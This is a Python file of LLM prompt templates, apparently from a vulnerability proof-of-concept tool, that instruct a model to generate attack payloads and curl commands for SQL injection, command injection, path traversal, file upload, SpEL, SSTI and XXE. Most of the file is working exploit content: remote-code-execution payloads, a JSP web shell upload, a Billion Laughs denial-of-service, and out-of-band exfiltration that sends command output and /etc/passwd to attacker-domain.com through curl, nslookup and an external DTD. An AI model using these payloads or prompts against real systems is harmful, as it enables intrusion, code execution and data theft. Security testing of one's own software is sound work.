# prompts/poc_prompts.py

VULN_SPECIFIC_PROMPTS = {
    "sql_injection": {
        "instructions": """
**Vulnerability-Specific Instructions: SQL Injection**
- Your goal is to construct a SQL query that can bypass authentication or extract data.
- Common payloads include using `OR '1'='1'`, `UNION SELECT`, time-based blind injection `(SELECT SLEEP(5))`, or boolean-based blind injection.
- Check if there are any filters for single quotes, double quotes, or comment symbols (`--`, `#`) in the code.
- In the few-shot example below, we show how to generate a payload for a simple login bypass.
- If you can see methods that handle filtering, try to bypass the filters first when generating payloads
""",
        "few_shot_example": """
**Few-Shot Example: SQL Injection**
*Input*
- route_info: `{"api": "/api/login", "method": "POST", "vuln_parameter": "username", "normal_parameters": ["password"], "vuln_type": "sql_injection"}`
- modification_functions: `[]`
- source_code: `... String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"; ...`

*Output (JSON)*
  "curl_command": "curl -s -i -X POST 'http://localhost:8080/users/login' -d 'username=%27%20AND%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20@@version),%200x7e))%20--%20&password=any_password'"
"""
    },
    "command_injection": {
        "instructions": """
# Core Objective
Analyze the given code snippet and API endpoint information to construct a malicious input that exploits vulnerabilities when user data is passed as parameters to operating system (OS) command execution. The ultimate goal is to execute arbitrary operating system commands on the target server.

# Key Concept
The essence of command injection is to break out of the original command context. By injecting OS-recognized command separators (such as ;, |, &&) or command substitution operators (such as $(command) or `command`), additional malicious commands can be appended and executed.

# Attack Techniques and Payload Construction

Technique 1: In-band Execution (Priority)

Description: Directly append new commands after the original command and expect to see results directly in the HTTP response. This may occur in certain situations (such as executing ping or cat commands).

Payload Example: 127.0.0.1; whoami

Technique 2: Time-based Blind Injection

Description: When command output cannot be directly seen, inject a command that causes server response delay (such as sleep) to determine if the vulnerability exists.

Payload Example: 127.0.0.1; sleep 10

Technique 3: Out-of-band Exfiltration

Description: This is one of the most reliable techniques. Inject a command that sends execution results over the network to an attacker-controlled server.

Payload Example (DNS): ; nslookup $(whoami).attacker-domain.com

Payload Example (HTTP): ; curl http://attacker-domain.com/$(whoami)

# Common Command Separators and Bypass Techniques

Linux/Unix:

;: Sequential execution, regardless of whether the previous command succeeded.

&&: Sequential execution, only executes the next command if the previous one succeeded.

||: Sequential execution, only executes the next command if the previous one failed.

|: Pipe operator, passes the output of the previous command as input to the next command.

\n or \r: Newline characters, can serve as command separators in some scripts.

`command` or $(command): Command substitution, uses command output as parameters.

Windows:

&: Sequential execution.

&&: Same as Linux.

||: Same as Linux.

Bypass Techniques:

Space Bypass: Use ${IFS} (Internal Field Separator) instead of spaces, e.g., cat${IFS}/etc/passwd.
Encoding: Use URL encoding, Hex encoding, etc.
String Concatenation: who'ami' or who""ami.
# Examples
Example 1: Simple Command Injection
Input:
route_info: {"api": "/api/v1/file/show", "method": "GET", "vuln_parameter": "filepath", "normal_parameters": [], "vuln_type": "command_injection"}

source_code: String command = "cat /var/www/files/" + filepath; Runtime.getRuntime().exec(command);

Expected Output:
  "curl_command": "curl -s -i -X GET 'http://localhost:8080/api/v1/file/show?filepath=non_existent_file.txt%3B%20whoami'"
Example 2: Out-of-band Exfiltration

Input:

route_info: {"api": "/api/utils/ping", "method": "POST", "vuln_parameter": "host", "normal_parameters": [], "vuln_type": "command_injection"}

source_code: String command = "ping -c 3 " + host; Runtime.getRuntime().exec(command);

Expected Payload:
  "curl_command": "curl -s -i -X POST 'http://localhost:8080/api/utils/ping' -d 'host=127.0.0.1%3B%20nslookup%20%24(whoami).attacker-domain.com'"
"""
    },
    "arbitrary_file_read": {
        "instructions": """
# Core Objective
Analyze the given code snippet and API endpoint information to construct a malicious input that exploits vulnerabilities in file path handling. The ultimate goal is to bypass access controls and read sensitive files outside the intended directory on the server.

# Key Concept
The core of arbitrary file reading is directory traversal (Directory Traversal). By injecting ../ or variant sequences, you can manipulate file paths to navigate upward from the current working directory and eventually access any location in the file system.

# Attack Techniques and Target Files

Technique: Path Concatenation

Description: Construct a series of ../ sequences to counteract the application's preset base path, enabling access to files in the root directory.

Linux Target Files:

/etc/passwd: User list, typically readable.

/etc/shadow: Encrypted user passwords, usually requires root privileges.

/proc/self/environ: Current process environment variables, may leak sensitive information.

Application log files: e.g., /var/log/apache2/access.log.

Windows Target Files:

C:\\Windows\\win.ini: System configuration file.

C:\\boot.ini: System boot configuration.

Payload Example: ../../../../../../../../etc/passwd

# Common Bypass Techniques

Filtering ../:

URL Encoding: Encode ../ as %2e%2e%2f.

Double URL Encoding: Encode as %252e%252e%252f.

Non-standard Encoding: Use ..%c0%af (overlong UTF-8) or ..%u2216.
Path Truncation: ....// or ..\\/.
Null Byte Injection:
Description: Add %00 at the end of the payload to truncate the string in certain languages (e.g., PHP < 5.3.4, C/C++), bypassing suffix restrictions.
Payload Example: ../../../../etc/passwd%00.jpg
# Examples

Example 1: Reading Linux System File

Input:

route_info: {"api": "/download", "method": "GET", "vuln_parameter": "filename", "normal_parameters": [], "vuln_type": "arbitrary_file_read"}

source_code: File file = new File("/var/www/downloads/" + filename);

Expected Output:
  "curl_command": "curl -s -i --path-as-is 'http://localhost:8080/download?filename=../../../../../etc/passwd'"
Note: curl's --path-as-is option prevents it from automatically normalizing ../ sequences in the path.

Example 2: Reading Windows System File with Suffix Bypass

Input:

route_info: {"api": "/api/v1/images", "method": "GET", "vuln_parameter": "file", "normal_parameters": [], "vuln_type": "arbitrary_file_read"}

source_code: String path = "D:\\web\\images\\" + file + ".png";

Expected Payload:
  "curl_command": "curl -s -i --path-as-is 'http://localhost:8080/api/v1/images?file=..%5c..%5c..%5c..%5cWindows%5cwin.ini%2500'"
"""
    },
    # NEW: Added for path injection and file upload scenarios
    "path-injection": {
        "instructions": """
Instruction: Generate Path Injection/File Upload attack payloads

# Core Objective
Analyze the given code snippet and API endpoint information to construct a file upload request containing a malicious path. The ultimate goal is to bypass the server's file storage path restrictions and write an executable file (such as a Web Shell) to an unexpected, publicly accessible, or executable location (such as the web root directory), thereby achieving remote code execution.

# Key Concept
The core of this vulnerability is exploiting the server's failure to adequately validate user-provided filenames. By injecting directory traversal sequences (../) into the filename, attackers can manipulate the final storage location of the file.
# Attack Techniques and Payloads
Technique 1: Directory Traversal Upload
Description: Include sufficient ../ sequences in the uploaded filename to jump from the preset upload directory to the target directory (such as the website root directory).
Payload Example (filename): ../../../../var/www/html/shell.jsp
Payload Content (Web Shell): A simple JSP/PHP/ASPX script for receiving and executing commands.
JSP Shell Example: <%@ page import="java.util.*,java.io.*"%> <% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); ... %>
Technique 2: Null Byte Bypass for Suffix Validation
Description: If server-side code checks file extensions (e.g., only allows .jpg files), append a null byte (%00) and a legitimate extension to the malicious filename. Some languages (like older PHP/C) treat the null byte as the end of the string, ignoring the subsequent legitimate extension, while the file system still creates the file with the original malicious filename (e.g., shell.jsp).
Payload Example (filename): shell.jsp%00.jpg
# Common Bypass Techniques
Encoding: URL encode ../ as %2e%2e%2f or double encode as %252e%252e%252f.
Path Separators: On Windows systems, mix \\ and /.
Content-Type Spoofing: Modify the Content-Type header of the uploaded Web Shell to an allowed type, such as image/jpeg, to bypass MIME type checks.
# Output Format
Based on the above strategies, generate a JSON object containing the following for the given input:
poc_details: Contains api, method, vuln_parameter_payload (malicious payload), and normal_parameter_payload (normal parameters). For file uploads, vuln_parameter_payload should contain an object with filename and content.
curl_command: A complete, executable curl command to reproduce the vulnerability.
# Examples
Example 1: Upload JSP Web Shell to Web Root Directory
Input:
route_info: {"api": "/file/upload", "method": "POST", "vuln_parameter": "file", "normal_parameters": [], "vuln_type": "java/path-injection"}
source_code: String filePath = "/var/www/uploads/" + multifile.getOriginalFilename(); new File(filePath).createNewFile(); ...
Expected Payload:
  "curl_command": "curl -s -i -X POST 'http://localhost:8080/file/upload' -F 'file=@- ;filename=\"../../../var/www/html/shell.jsp\"' --data-binary '<%@ page import=\"java.io.*\" %><% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>'"
Note: The curl command uses -F to simulate file upload. filename= is used to override the original filename, and --data-binary provides the file content.
Example 2: Bypass Content-Type and Extension Checks
Input:
route_info: {"api": "/api/avatar/upload", "method": "POST", "vuln_parameter": "avatar", "normal_parameters": [], "vuln_type": "java/path-injection"}
source_code: if (!avatar.getContentType().startsWith("image/")) { return "Error"; } String filename = avatar.getOriginalFilename(); if (!filename.endsWith(".png")) { return "Error"; } ...
Expected Payload:
  "curl_command": "curl -s -i -X POST 'http://localhost:8080/api/avatar/upload' -F 'avatar=@- ;filename=\"shell.jsp%00.png\";type=image/png' --data-binary '<% out.println(\"Shell Uploaded!\"); %>'"
Note: The curl command uses type=image/png to set a deceptive Content-Type, while the filename contains a null byte to bypass extension checks.
"""
    },
    "spel_injection" : {
      "instructions" : """
      Instruction: Generate SpEL Expression Injection attack payloads

# Core Objective
Analyze the given code snippet and API endpoint information to construct a malicious Spring Expression Language (SpEL) expression. The ultimate goal is to exploit vulnerabilities in server-side SpEL expression parsing of user input to execute arbitrary Java code or operating system commands on the server.

# Key Concept
The essence of SpEL injection is treating user-controllable data as executable code. When an application uses SpelExpressionParser to parse strings containing user input, attackers can submit text conforming to SpEL syntax to call Java classes, execute methods, access object properties, thereby achieving remote code execution (RCE). Specifically, if the application uses TemplateParserContext, expressions must be wrapped in #{}.

# Attack Techniques and Payloads

Technique 1: Context Probing

Description: Execute simple mathematical operations or string manipulations to confirm if the input point is indeed parsing SpEL expressions.

Payload Example: 9*9 or 'abc'.toUpperCase()

Templated Payload Example: #{9*9}

Technique 2: Java Class Instantiation & Method Invocation

Description: This is the core attack method. Use T(ClassName) syntax to reference Java classes, then call their static methods or create instances using the new keyword and call their methods.

Payload Example (execute command): T(java.lang.Runtime).getRuntime().exec('id')

Payload Example (read file): new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\A').next()

Technique 3: Templated Expression Injection

Description: When code uses TemplateParserContext, SpEL expressions must be wrapped in #{} delimiters. This is typically used to embed expressions into longer string templates.

Payload Example: #{T(java.lang.Runtime).getRuntime().exec('id')}

Technique 4: Accessing Spring Context

Description: In some cases, it's possible to access Beans in the Spring application context and call their methods.

Payload Example: @beanName.someMethod()

# Common Bypass Techniques

String Concatenation: If the server filters keywords like Runtime, string concatenation can be used to bypass.

Example: T(java.lang.Ru' + 'ntime).getRuntime().exec('id')

Using java.lang.ProcessBuilder: ProcessBuilder is an alternative to Runtime.exec.

Example: new java.lang.ProcessBuilder({'/bin/sh', '-c', 'id'}).start()

Hex Encoding: Encode commands or class names in Hex, then decode them in SpEL, which can bypass more complex filters.

Example: T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{0x69, 0x64})) (executes id command)

# Output Format
Based on the above strategies, generate a JSON object containing the following for the given input:

poc_details: Contains api, method, vuln_parameter_payload (malicious payload), and normal_parameter_payload (normal parameters).

curl_command: A complete, executable curl command to reproduce the vulnerability.

# Examples

Example 1: Execute command via request parameters (standard context)
Input:
route_info: {"api": "/search", "method": "GET", "vuln_parameter": "query", "normal_parameters": [], "vuln_type": "spel_injection"}
source_code: ExpressionParser parser = new SpelExpressionParser(); Expression exp = parser.parseExpression(query); exp.getValue();
Expected payload:
  "curl_command": "curl -s -i 'http://localhost:8080/search?query=T(java.lang.Runtime).getRuntime().exec(%27whoami%27)'"

Example 2: Execute command via POST request body (standard context)

Input:

route_info: {"api": "/api/v1/recalculate", "method": "POST", "vuln_parameter": "expression", "normal_parameters": [], "vuln_type": "spel_injection"}

source_code: Expression exp = parser.parseExpression(requestBody.get("expression"));

Expected payload:

  "curl_command": "curl -s -i -X POST 'http://localhost:8080/api/v1/recalculate' -H 'Content-Type: application/json' -d '{\"expression\": \"new java.lang.ProcessBuilder({\\'/bin/sh\\',\\'-c\\',\\'cat /etc/hostname\\'}).start()\"}'"

Example 3: Templated injection (TemplateParserContext)

Input:
route_info: {"api": "/api/v1/greeting", "method": "GET", "vuln_parameter": "name", "normal_parameters": [], "vuln_type": "spel_injection"}
source_code: Expression expression = parser.parseExpression("Hello " + name, new TemplateParserContext());
Expected payload:
  "curl_command": "curl -s -i 'http://localhost:8080/api/v1/greeting?name=%23%7BT(java.lang.Runtime).getRuntime().exec(%27whoami%27)%7D'"
Note: Since TemplateParserContext is used, the malicious payload must be wrapped in #{}. In the curl command, %23%7B and %7D are the URL encodings for #{ and } respectively.
      
      """
    },
    "ssti": {
      "instructions":"""
      Instruction: Generate Java Web Framework SSTI (Server-Side Template Injection) attack payloads

# Core Objective
Analyze the given code snippet and API endpoint information to construct a malicious input that conforms to specific template engine syntax. The ultimate goal is to exploit vulnerabilities in server-side template rendering of user input to execute arbitrary Java code or operating system commands on the server.

# Key Concept
The essence of SSTI is treating user-controllable data as template directives to execute. When an application directly embeds user input into template files for rendering, attackers can inject specific template engine syntax to escape from the data context and enter the code execution context.

# Attack Techniques and Payloads (by template engine)

1. FreeMarker
Syntax Features: ${...} (interpolation), <#...> (directives)

Attack Approach: FreeMarker has a powerful new() directive built-in that can create arbitrary Java objects, thus opening the door for command execution.

Payload Example (execute command):

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

Payload Example (alternative approach):

${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}

2. Velocity
Syntax Features: ${...} (interpolation), #set(...) (directives)

Attack Approach: Velocity itself doesn't have built-in tools for direct command execution, but attackers can usually access objects in the context (such as request), then use Java reflection mechanism to create and execute commands.

Payload Example (execute command):

#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('whoami'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

3. Thymeleaf
Syntax Features: th:text, [[...]], [(...)]

Attack Approach: Thymeleaf is tightly integrated with the Spring framework, and its SSTI vulnerabilities typically exploit SpringEL expressions. Attackers need to find a way to construct an expression that can be parsed by Thymeleaf as SpEL.

Payload Example (SpringEL RCE):

Need to find a place that triggers expression preprocessing.

Payload Format: __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__::.x

URL Encoded: __%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).useDelimiter(%22%5C%5CA%22).next()%7D__::.x

# Output Format
Based on the above strategies, generate a JSON object containing the following for the given input:

poc_details: Contains api, method, vuln_parameter_payload (malicious payload), and normal_parameter_payload (normal parameters).

curl_command: A complete, executable curl command to reproduce the vulnerability.

# Examples

Example 1: FreeMarker SSTI
Input:
route_info: {"api": "/profile", "method": "GET", "vuln_parameter": "name", "normal_parameters": [], "vuln_type": "freemarker_ssti"}
source_code: Template template = cfg.getTemplate("profile.ftl"); template.process(data, writer); (assuming name is directly placed into data)
Expected payload:
  "curl_command": "curl -s -i 'http://localhost:8080/profile?name=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%20%24%7B%20ex(%22whoami%22)%20%7D'"

Example 2: Thymeleaf SSTI
Input:
route_info: {"api": "/articles", "method": "GET", "vuln_parameter": "view", "normal_parameters": [], "vuln_type": "thymeleaf_ssti"}
source_code: return "articles/" + view; (In Spring Boot, if the returned string contains special characters like ::, it may be treated as a template fragment)
Expected payload:
  "curl_command": "curl -s -i 'http://localhost:8080/articles?view=__%24%7BT(java.lang.Runtime).getRuntime().exec(%27id%27)%7D__::.x'"
Example 3: Velocity SSTI

Input:

route_info: {"api": "/api/v1/preview", "method": "POST", "vuln_parameter": "template", "normal_parameters": [], "vuln_type": "velocity_ssti"}

source_code: Velocity.evaluate(context, writer, "logtag", userInput); (assuming userInput comes from template parameter)

Expected payload:

  "curl_command": "curl -s -i -X POST 'http://localhost:8080/api/v1/preview' -H 'Content-Type: application/json' -d '{\"template\": \"#set($x=\\'\\') #set($rt=$x.class.forName(\\'java.lang.Runtime\\')) #set($ex=$rt.getRuntime().exec(\\'id\\')) $ex.waitFor() #set($out=$ex.getInputStream()) #set($str=\\'\\') #foreach($i in [1..$out.available()]) #set($str=$str.concat($out.read().toString())) #end $str\"}'"

      """
    },
    "xxe": {
      "instructions": """
      Instruction: Generate Java XXE (XML External Entity) attack payloads

# Core Objective
Analyze the given code snippet and API endpoint information to construct an XML document containing malicious XML external entities. The ultimate goal is to exploit vulnerabilities in server-side XML parser handling of external entities to read arbitrary files on the server, probe internal networks, or cause denial of service (DoS).

# Key Concept
The essence of XXE is abusing the XML specification's feature that allows referencing external entities. When a misconfigured XML parser processes user-submitted XML, it parses and executes external entities defined in <!DOCTYPE>, for example, using the SYSTEM keyword to include local files or access URLs. Attackers can exploit this to steal data or launch attacks.

# Attack Techniques and Payloads

Technique 1: File Reading (Classic XXE)

Description: Define an external entity whose value is a file path (using file:// protocol), then reference this entity in the XML document body. When the parser renders the XML, the file content will be included and may be returned in the HTTP response.

Payload Example (read /etc/passwd):

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>password</password>
</user>

Technique 2: Out-of-Band Data Exfiltration (Out-of-Band XXE)

Description: This technique is very effective when the server doesn't directly return file content (blind XXE). It constructs a nested entity that first reads the target file, then sends the file content as parameters through another entity to an attacker-controlled server.

Payload Example (send /etc/passwd to external server):

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker-domain.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>

evil.dtd file content (on attacker's server):

<!ENTITY % send "<!ENTITY send SYSTEM 'http://attacker-domain.com/?data=%file;'>">

Technique 3: Denial of Service (Billion Laughs Attack)

Description: By defining recursively referenced XML entities, cause the XML parser to consume memory and CPU exponentially when expanding entities, eventually crashing the server.

Payload Example:

<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

# Output Format
Based on the above strategies, generate a JSON object containing the following for the given input:

poc_details: Contains api, method, vuln_parameter_payload (malicious XML payload), and normal_parameter_payload (normal parameters).

curl_command: A complete, executable curl command to reproduce the vulnerability.

# Examples

Example 1: File reading via XXE

Input:

route_info: {"api": "/api/v1/userinfo", "method": "POST", "vuln_parameter": "xml_body", "normal_parameters": [], "vuln_type": "xxe"}

source_code: DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); db.parse(request.getInputStream()); (default configuration is vulnerable)

Expected payload:

  "curl_command": "curl -s -i -X POST 'http://localhost:8080/api/v1/userinfo' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username></user>'"

Example 2: Out-of-band data exfiltration via XXE

Input:

route_info: {"api": "/api/v1/processXML", "method": "POST", "vuln_parameter": "xml_body", "normal_parameters": [], "vuln_type": "xxe_oob"}

source_code: XMLReader reader = XMLReaderFactory.createXMLReader(); reader.parse(new InputSource(request.getInputStream()));

Expected payload:

  "curl_command": "curl -s -i -X POST 'http://localhost:8080/api/v1/processXML' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\" ?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % dtd SYSTEM \"http://attacker-domain.com/evil.dtd\">%dtd;]><data>&send;</data>'"

      """
    }
    ,"default": {
        "instructions": "**Vulnerability-Specific Instructions: None**\n- Please analyze based on general vulnerability knowledge.",
    }
}

def get_vuln_specific_prompt(vuln_type: str) -> str:
    """
    Get specific prompt content based on vulnerability type.
    
    Args:
        vuln_type: Vulnerability type string, e.g., "sql_injection".
        
    Returns:
        A formatted string containing specific instructions and few-shot examples.
    """
    prompt_data = VULN_SPECIFIC_PROMPTS.get(vuln_type, VULN_SPECIFIC_PROMPTS["default"])
    return f"{prompt_data['instructions']}\n"



if __name__ == "__main__" :
  for key, value in VULN_SPECIFIC_PROMPTS.items():
    print(key) 